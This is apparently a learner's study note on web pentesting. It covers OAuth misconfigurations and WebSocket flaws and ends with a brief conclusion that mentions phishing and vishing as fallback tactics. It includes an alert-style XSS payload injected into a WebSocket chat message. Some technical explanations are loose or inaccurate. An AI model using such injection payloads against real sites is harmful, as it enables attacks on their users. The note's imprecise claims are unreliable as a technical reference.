Because of how it designed for simplicity and flexible, it is so easy to access resources without security restrictions as long as you can have your way to obtain authorization code and access token. OAuth's flexibility make it easier for developers to miss to important configuration. 

<h2>Tip to spot OAuth</h2>

Intercept the request with Burp

```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```

<h2>Vulnerability Types</h2>

1. Improper implementation of the implicit grant type = the OAuth doesn't validate the session cookies allowing users to impersonate other session's cookies. Grant types are powerful, so devs should pay extra attention as it allows different kind of authorities to users

2. No CSRF = the exploit is the same as a normal csrf attack

3. Leaking authorization codes and access tokens via redirect_url. a


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## WebSocket

It makes sure the connection between browser and server is alive using HTTP port. The difference between HTTP and WebSockets is that HTTP send a request to web server, the server replies to establish a connection. In WebSockets, it does the same thing but it keeps the connection alive until one of them sends a request. If you are imagine how WebSockets looks like. then it looks like this. 

```
var ws = new WebSocket("wss://normal-website.com/chat");
```

The above is it create a variable named ws(web socket). Inside this variable contains web sokect connection on wss schema where dns is normak-website.com witht the aboev web directory. **Note: WSS is an encrypted version while WS is unencrypted version. WSS is more secure.**

To establish a WSS connection, the web server and web browser are required to establish WSS handshake, i believe it is like a TCP handshake.

```
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

If the connectoin is successfully established, the response request would look like this.

```
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```

<h2>How can exploit it?</h2>

Because of it nature, we can try to manipulate web sockets network traffic. This means we can intercept, modify, replay request using Burp. Pretty similar to how we use Burp to intercept requests.

<h2>Vulnerabilities</h2>

1. SQL injection
2. XSS
3. XXE

<h2>Scenario Example</h2>

Let say a chatbot submitted user's messages.

```
{"message":"Hello Carlos"}
```

If we can intercept a WS request, we can try to modify the content in JSON data.

so,

{"message":"<img src=1 onerror='alert(1)'.>"}

This will send a XSS script instead of intended messages.

<h2>How to prevent web sockets vulnerabilities</h2>

1. Strcitly use WSS
2. Hard-coding WS endpoints
3. Treat all requests from WS as untrusted.

**Note: an attacker can do cross-domain websockets as well. This is when the attacker is able to exploit CSRF. By making the vicim connect to attacker's web server, the attacker can then send this request with modified contents via WS network connection to the web server. Because  of WS is allowed any forms of data to be sent, thats why it easy for attackers to modify data in JSON**


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## My-conclusion

In the end, web pentesting is all about finding a way to interact with the web server. as long as websites are allowed users to interact with web servers, there ARE always a way to exploit or misuse it. With that being said, there are mainly 2 things I can do.

1. Play under their games. I can try to figure out how the web app work first. then find a way to exploit those functions using general knowlege or creativity lol.

2. Human psychology. If all functions are hardcoded and i couldnt crack any function, i can use human psychology using techniques like phishing, spear-phising, vishing etc. Although i might not be able to use it in pentesting. this is quite useful to know.

**Web pentesting in a nutshell. As long as there is a way to interact with the web server, the possibilities are limitless!**

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
